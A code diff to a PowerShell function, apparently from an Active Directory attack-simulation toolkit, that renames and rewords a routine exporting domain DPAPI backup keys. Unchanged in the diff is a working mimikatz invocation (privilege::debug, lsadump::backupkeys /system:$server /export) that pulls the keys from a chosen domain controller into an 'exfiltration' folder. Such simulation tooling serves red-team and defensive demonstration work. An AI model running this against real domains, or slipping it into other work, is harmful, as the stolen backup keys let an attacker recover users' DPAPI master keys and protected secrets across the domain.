@@ -1,35 +1,34 @@
 <#
 .SYNOPSIS
-Attempts to export domain DPAPI backup keys from a selected domain controller and lists the exported files.
+Attempts to export domain DPAPI backup keys from a selected domain controller.
 
 .FUNCTIONALITY
-Attempts to export domain DPAPI backup keys from a selected domain controller and lists the exported files.
-Demonstrates the risk of domain backup-key exposure for recovering user DPAPI master keys and protected secrets.
-Recovery also requires the relevant encrypted data; this does not decrypt every secret on domain-joined machines.
+Attempts to export domain DPAPI backup keys and lists matching files in the output folder.
+Exposed domain backup keys can help recover user DPAPI master keys when the corresponding encrypted data is available.
 #>
-function Export-DPAPIMasterKey {
+function Export-DPAPIBackupKey {
 
     ################################################################################
     #####                                                                      ##### 
-    #####    Export DPAPI Master Key from a Domain Controller using Mimikatz.  #####                                
+    #####   Export domain DPAPI backup keys using Mimikatz                      #####
     #####                                                                      #####
     ################################################################################
 
     $Info = Measure-FunctionRuntime -Begin
 
-    Write-AS2GoOutput -Type Header -Message "Export-DPAPIMasterKey"
+    Write-AS2GoOutput -Type Header -Message "Export DPAPI Backup Keys from a Domain Controller"
     Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
     New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore
     
-    $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain to get a Domain Controller for DPAPI Master Key Export"
+    $dn = Select-ADObject -DomainSelectionOnly -Title "Select a domain for the DPAPI backup key export"
     $server = Get-BestDomainController -domain $dn
     
     Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "cd $Script:DefautExfiltrationFolder" "privilege::debug" "lsadump::backupkeys /system:$server /export" "exit" }
     
     get-item "$Script:DefautExfiltrationFolder\ntds_*" | Sort-Object LastWriteTime -Descending | out-host
     
-    Write-AS2GoOutput -type Success -Message "DPAPI Master Key Exported to $Script:DefautExfiltrationFolder from DC '$server'."
+    Write-AS2GoOutput -Type Info -Message "Attempted to export domain DPAPI backup keys from '$server' to '$Script:DefautExfiltrationFolder'."
     
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     
